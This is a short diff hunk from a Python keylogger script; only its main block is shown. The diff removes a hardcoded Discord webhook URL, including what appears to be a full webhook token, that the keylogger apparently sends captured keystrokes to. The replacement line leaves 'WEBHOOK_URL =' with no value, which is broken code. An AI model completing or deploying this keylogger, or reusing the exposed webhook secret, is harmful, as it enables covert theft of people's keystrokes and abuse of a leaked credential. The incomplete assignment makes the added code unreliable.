@@ -49,7 +49,7 @@ class KeyLogger:
 
 
 if __name__ == "__main__":
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1463184818488741898/81ICKPzkL04vjgDjrgn3L37WMu4gjCZ3joj3OIzz9jrOL9wOTCX_GHvEUZOvmUiKLjWq"
+    WEBHOOK_URL = 
     TIME_INTERVAL = 6.7
     
     logger = KeyLogger(WEBHOOK_URL, TIME_INTERVAL)
